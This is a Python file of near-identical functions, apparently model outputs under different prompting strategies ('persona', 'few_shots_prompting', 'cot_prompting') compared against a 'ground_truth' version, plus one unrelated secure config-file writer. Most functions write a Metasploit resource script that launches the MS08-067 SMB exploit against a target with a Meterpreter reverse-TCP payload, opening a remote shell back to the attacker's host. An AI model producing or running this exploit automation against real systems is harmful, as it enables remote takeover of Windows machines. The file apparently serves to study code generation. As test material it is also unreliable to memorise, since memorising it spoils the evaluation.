def ground_truth_code_confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

def persona_confickerExploit(configFile, tgtHost, lhost, lport):
    config_lines = [
        'use exploit/windows/smb/ms08_067_netapi\n',
        'set RHOST ' + str(tgtHost) + '\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        'set LPORT ' + str(lport) + '\n',
        'set LHOST ' + str(lhost) + '\n',
        'exploit -j -z\n'
    ]
    with open(configFile, 'w') as file:
        file.writelines(config_lines)

def template_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except (IOError, ValueError, TypeError) as e:
        print(f"An error occurred while writing to the config file: {str(e)}")

def question_refinement_write_secure_config_file(file_path, config_settings):
    if not isinstance(file_path, str) or '..' in file_path or file_path.startswith('/'):
        raise ValueError("Invalid file path.")
    if not isinstance(config_settings, dict):
        raise ValueError("config_settings must be a dictionary.")
    for key, value in config_settings.items():
        if not isinstance(key, str) or not isinstance(value, str):
            raise ValueError("All keys and values in config_settings must be strings.")
    sanitized_settings = {key: value.replace('"', '\"').replace("'", "\'") for key, value in config_settings.items()}
    try:
        with open(file_path, 'w', encoding='utf-8') as config_file:
            json.dump(sanitized_settings, config_file, indent=4, ensure_ascii=False)
        return True
    except OSError as e:
        print(f"Failed to write to file {file_path}: {e}")
        return False

def alternative_approaches_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w', encoding='utf-8') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgtHost}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        raise Exception(f"IO Error: {e}")
    except Exception as e:
        raise Exception(f"Unexpected Error: {e}")

def context_manager_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            lines = [
                'use exploit/windows/smb/ms08_067_netapi\n',
                'set RHOST ' + str(tgtHost) + '\n',
                'set payload windows/meterpreter/reverse_tcp\n',
                'set LPORT ' + str(lport) + '\n',
                'set LHOST ' + lhost + '\n',
                'exploit -j -z\n'
            ]
            file.writelines(lines)
    except IOError as e:
        print(f"An error occurred while writing to the file: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def flipped_interaction_3_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except Exception as e:
        print(f"An error occurred while writing to the config file: {e}")

import ipaddress
def flipped_interaction_4_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        ipaddress.ip_address(tgtHost)
        ipaddress.ip_address(lhost)
    except ValueError as e:
        raise ValueError(f"Invalid IP address format: {e}")
    if not (1 <= lport <= 65535):
        raise ValueError("Port number must be between 1 and 65535")
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write(f'set RHOST {tgtHost}\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write(f'set LPORT {lport}\n')
    configFile.write(f'set LHOST {lhost}\n')
    configFile.write('exploit -j -z\n')

def flipped_interaction_5_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgtHost}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
        return True, "Configuration written successfully."
    except Exception as e:
        return False, f"An error occurred while writing to the file: {e}"

def iterative_prompting_3_conficker_exploit(config_file, tgt_host, lhost, lport):
    if not isinstance(config_file, str) or not config_file.endswith('.rc'):
        raise ValueError('Invalid configuration file name. Must be a string ending with .rc')
    if not isinstance(tgt_host, str) or not isinstance(lhost, str):
        raise ValueError('Host addresses must be strings.')
    if not isinstance(lport, int) or lport <= 0 or lport > 65535:
        raise ValueError('LPORT must be an integer between 1 and 65535.')
    try:
        with open(config_file, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgt_host}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        print(f'Error writing to file {config_file}: {e}')

import os
def iterative_prompting_4_conficker_exploit(config_file, tgt_host, lhost, lport):
    if not isinstance(tgt_host, str) or not isinstance(lhost, str):
        raise ValueError("Target host and local host must be valid IP addresses or domain names.")
    if not isinstance(lport, int) or not (1 <= lport <= 65535):
        raise ValueError("LPORT must be an integer between 1 and 65535.")
    if not config_file or not isinstance(config_file, str):
        raise ValueError("Config file name must be a valid string.")
    try:
        directory = os.path.dirname(config_file)
        if directory:
            os.makedirs(directory, exist_ok=True)
        with open(config_file, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgt_host}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        print(f"Failed to write to {config_file}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

import re
def iterative_prompting_5_conficker_exploit(config_file, tgt_host, lhost, lport):
    def is_valid_ip(ip_address):
        pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
        return pattern.match(ip_address) is not None and all(0 <= int(octet) <= 255 for octet in ip_address.split('.'))
    def is_valid_port(port):
        return isinstance(port, int) and 0 < port < 65536
    if not (is_valid_ip(tgt_host) and is_valid_ip(lhost)):
        raise ValueError("Invalid IP address format.")
    if not is_valid_port(lport):
        raise ValueError("Port must be an integer between 1 and 65535.")
    try:
        with open(config_file, 'w', encoding='utf-8') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgt_host}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        print(f"An error occurred while writing to the file: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def few_shots_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except Exception as e:
        print(f'An error occurred while writing to the config file: {e}')

def cot_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

def fact_check_list_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write(f'set RHOST {tgtHost}\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
    except IOError as e:
        print(f"An IOError has occurred: {e}")

def not_interactive_mix_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        if not isinstance(tgtHost, str) or not isinstance(lhost, str):
            raise ValueError("Both tgtHost and lhost must be strings.")
        lport = int(lport)
        if not (0 <= lport <= 65535):
            raise ValueError("Port number must be between 0 and 65535.")
        lines = [
            'use exploit/windows/smb/ms08_067_netapi\n',
            f'set RHOST {tgtHost}\n',
            'set payload windows/meterpreter/reverse_tcp\n',
            f'set LPORT {lport}\n',
            f'set LHOST {lhost}\n',
            'exploit -j -z\n'
        ]
        with open(configFile, 'w') as file:
            file.writelines(lines)
    except ValueError as ve:
        print("Error: ", ve)
    except OSError as oe:
        print("Error: Unable to write to the configuration file.", oe)
    except Exception as e:
        print("An unexpected error occurred.", e)

def interactive_mix_write_config_file(tgtHost, lport, lhost, filepath):
    import os
    import ipaddress
    try:
        ipaddress.ip_address(tgtHost)
    except ValueError:
        raise ValueError("Invalid target host IP address")
    if not (0 <= lport <= 65535):
        raise ValueError("Port number out of range")
    try:
        ipaddress.ip_address(lhost)
    except ValueError:
        raise ValueError("Invalid local host IP address")
    try:
        with open(filepath, 'w') as f:
            f.write('use exploit/windows/smb/ms08_067_netapi\n')
            f.write(f'set RHOST {tgtHost}\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')
    except IOError as e:
        raise IOError(f"Error writing to file: {e}")

def baseline_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

